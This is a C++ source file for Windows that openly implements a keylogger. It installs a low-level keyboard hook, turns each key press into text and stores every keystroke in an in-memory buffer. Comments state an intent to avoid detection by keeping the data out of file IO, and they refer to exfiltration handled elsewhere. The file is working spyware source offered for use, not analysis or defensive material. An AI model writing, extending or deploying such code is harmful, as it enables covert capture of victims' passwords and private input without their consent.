#include "keylogger.h"
#include "config.hpp"
#include <windows.h>
#include <string>

using namespace std;

// Buffer to store keystrokes
// in memory, so no IO reads to give away
static std::string key_buffer;

// Helper for key name mapping
static std::string get_key_name(DWORD vk_code) {
    switch(vk_code) {
        case VK_SPACE: return " ";
        case VK_RETURN: return "[ENTER]"; 
        case VK_BACK: return "[BACKSPACE]";
        case VK_TAB: return "[TAB]";
        case VK_ESCAPE: return "[ESC]";
        case VK_DELETE: return "[DEL]";
        case VK_UP: return "[UP]";
        case VK_DOWN: return "[DOWN]";
        case VK_LEFT: return "[LEFT]";
        case VK_RIGHT: return "[RIGHT]";
        case VK_SHIFT: 
        case VK_LSHIFT: 
        case VK_RSHIFT: return "[SHIFT]";
        case VK_CONTROL: 
        case VK_LCONTROL: 
        case VK_RCONTROL: return "[CTRL]";
        case VK_MENU: 
        case VK_LMENU: 
        case VK_RMENU: return "[ALT]";
        case VK_LWIN: 
        case VK_RWIN: return "[WIN]";
        case VK_CAPITAL: return "[CAPS]";
        case VK_NUMLOCK: return "[NUM]";
        case VK_SCROLL: return "[SCROLL]";
        case VK_PRIOR: return "[PGUP]";
        case VK_NEXT: return "[PGDN]";
        case VK_END: return "[END]";
        case VK_HOME: return "[HOME]";
        case VK_INSERT: return "[INS]";
        case VK_F1: return "[F1]";
        case VK_F2: return "[F2]";
        case VK_F3: return "[F3]";
        case VK_F4: return "[F4]";
        case VK_F5: return "[F5]";
        case VK_F6: return "[F6]";
        case VK_F7: return "[F7]";
        case VK_F8: return "[F8]";
        case VK_F9: return "[F9]";
        case VK_F10: return "[F10]";
        case VK_F11: return "[F11]";
        case VK_F12: return "[F12]";
        default:
            if (vk_code >= 'A' && vk_code <= 'Z') {
                bool shift_pressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
                bool caps_on = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
                
                if ((shift_pressed && !caps_on) || (!shift_pressed && caps_on)) {
                    return string(1, (char)vk_code);
                } else {
                    return string(1, (char)(vk_code + 32));
                }
            }
            if (vk_code >= '0' && vk_code <= '9') {
                return string(1, (char)vk_code);
            }
            switch(vk_code) {
                case VK_OEM_PERIOD: return ".";
                case VK_OEM_COMMA: return ",";
                case VK_OEM_MINUS: return "-";
                case VK_OEM_PLUS: return "=";
                case VK_OEM_1: return ";";
                case VK_OEM_2: return "/";
                case VK_OEM_3: return "`";
                case VK_OEM_4: return "[";
                case VK_OEM_5: return "\\";
                case VK_OEM_6: return "]";
                case VK_OEM_7: return "'";
                default: return "[" + to_string(vk_code) + "]";
            }
    }
}

// Keyboard hook callback
static LRESULT CALLBACK keyboard_callback(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode < 0) return CallNextHookEx(NULL, nCode, wParam, lParam);

    if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
        KBDLLHOOKSTRUCT* key = (KBDLLHOOKSTRUCT*)lParam;
        DWORD key_code = key->vkCode;

        std::string key_name = get_key_name(key_code);
        key_buffer += key_name;
        

        // Optionally: trigger exfiltration if buffer is large (handled elsewhere)
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void start_keylogger() {
    HHOOK hook = SetWindowsHookExA(WH_KEYBOARD_LL, keyboard_callback, GetModuleHandle(NULL), 0);
    if (!hook) {
        return;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hook);
}